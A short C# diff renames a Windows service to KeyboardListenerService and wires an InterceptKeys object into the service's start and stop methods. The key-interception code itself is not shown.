@@ -8,21 +8,26 @@ using System.ServiceProcess;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace KeyboardListenerService
+namespace KeyboardListenerServicePrj
 {
-    public partial class Service1 : ServiceBase
+    public partial class KeyboardListenerService : ServiceBase
     {
-        public Service1()
+        private InterceptKeys interceptKeys;
+        public KeyboardListenerService()
         {
             InitializeComponent();
+            interceptKeys = new InterceptKeys();
         }
 
         protected override void OnStart(string[] args)
         {
+            
+            interceptKeys.Start();
         }
 
         protected override void OnStop()
         {
+            interceptKeys.Stop();
         }
     }
 }
